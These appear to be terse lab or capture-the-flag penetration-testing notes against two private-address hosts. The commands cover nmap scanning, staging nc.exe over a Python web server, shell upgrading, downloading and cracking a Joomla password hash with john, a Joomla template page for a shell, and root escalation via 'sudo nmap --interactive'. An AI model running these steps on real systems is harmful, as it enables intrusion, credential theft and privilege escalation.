192.168.1.12 ubuntu

192.168.1.13 windows

**nmap scan ports**

```
#> nmap -sV -sC 192.168.1.12

```



**start a simple http server**

```
#> python3 -m http.server 80
```



**prepare nc.exe on Kali**

```
#> cp /usr/share/windows-binaries/nc.exe .
```

------

------



**spawn bash shell**

```
$ python -c "import pty;pty.spawn('/bin/bash')"

ctrl-z

$ stty raw -echo
$ fg
```



**crack the hash**

192.168.1.12/joomla/password

```
curl 192.168.1.12/joomla/password -o passwd
```





<https://crackstation.net/>

```
$ hash-identifier

$ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt ./pwd.hash
$ john --format=raw-MD5 --show ./pwd.hash
```



```
http://192.168.1.12/joomla/templates/protostar/index.php
```

```
sudo -l 

sudo nmap --interactive
!bash
```

